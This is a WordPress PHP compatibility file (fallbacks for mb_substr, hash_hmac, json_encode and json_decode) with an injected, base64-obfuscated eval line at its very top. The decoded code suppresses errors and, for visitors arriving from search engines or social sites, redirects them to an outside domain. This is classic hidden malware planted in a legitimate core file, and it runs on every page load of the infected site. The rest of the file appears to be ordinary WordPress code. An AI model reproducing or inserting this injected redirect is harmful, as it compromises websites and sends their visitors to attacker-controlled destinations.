<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * WordPress implementation for PHP functions either missing from older PHP versions or not included by default.
 *
 * @package PHP
 * @access private
 */

// If gettext isn't available
if ( !function_exists('_') ) {
	function _($string) {
		return $string;
	}
}

if ( !function_exists('mb_substr') ):
	function mb_substr( $str, $start, $length=null, $encoding=null ) {
		return _mb_substr($str, $start, $length, $encoding);
	}
endif;

function _mb_substr( $str, $start, $length=null, $encoding=null ) {
	// the solution below, works only for utf-8, so in case of a different
	// charset, just use built-in substr
	$charset = get_option( 'blog_charset' );
	if ( !in_array( $charset, array('utf8', 'utf-8', 'UTF8', 'UTF-8') ) ) {
		return is_null( $length )? substr( $str, $start ) : substr( $str, $start, $length);
	}
	// use the regex unicode support to separate the UTF-8 characters into an array
	preg_match_all( '/./us', $str, $match );
	$chars = is_null( $length )? array_slice( $match[0], $start ) : array_slice( $match[0], $start, $length );
	return implode( '', $chars );
}

if ( !function_exists('hash_hmac') ):
function hash_hmac($algo, $data, $key, $raw_output = false) {
	return _hash_hmac($algo, $data, $key, $raw_output);
}
endif;

function _hash_hmac($algo, $data, $key, $raw_output = false) {
	$packs = array('md5' => 'H32', 'sha1' => 'H40');

	if ( !isset($packs[$algo]) )
		return false;

	$pack = $packs[$algo];

	if (strlen($key) > 64)
		$key = pack($pack, $algo($key));

	$key = str_pad($key, 64, chr(0));

	$ipad = (substr($key, 0, 64) ^ str_repeat(chr(0x36), 64));
	$opad = (substr($key, 0, 64) ^ str_repeat(chr(0x5C), 64));

	$hmac = $algo($opad . pack($pack, $algo($ipad . $data)));

	if ( $raw_output )
		return pack( $pack, $hmac );
	return $hmac;
}

if ( !function_exists('json_encode') ) {
	function json_encode( $string ) {
		global $wp_json;

		if ( !is_a($wp_json, 'Services_JSON') ) {
			require_once( ABSPATH . WPINC . '/class-json.php' );
			$wp_json = new Services_JSON();
		}

		return $wp_json->encodeUnsafe( $string );
	}
}

if ( !function_exists('json_decode') ) {
	function json_decode( $string, $assoc_array = false ) {
		global $wp_json;

		if ( !is_a($wp_json, 'Services_JSON') ) {
			require_once( ABSPATH . WPINC . '/class-json.php' );
			$wp_json = new Services_JSON();
		}

		$res = $wp_json->decode( $string );
		if ( $assoc_array )
			$res = _json_decode_object_helper( $res );
		return $res;
	}
	function _json_decode_object_helper($data) {
		if ( is_object($data) )
			$data = get_object_vars($data);
		return is_array($data) ? array_map(__FUNCTION__, $data) : $data;
	}
}
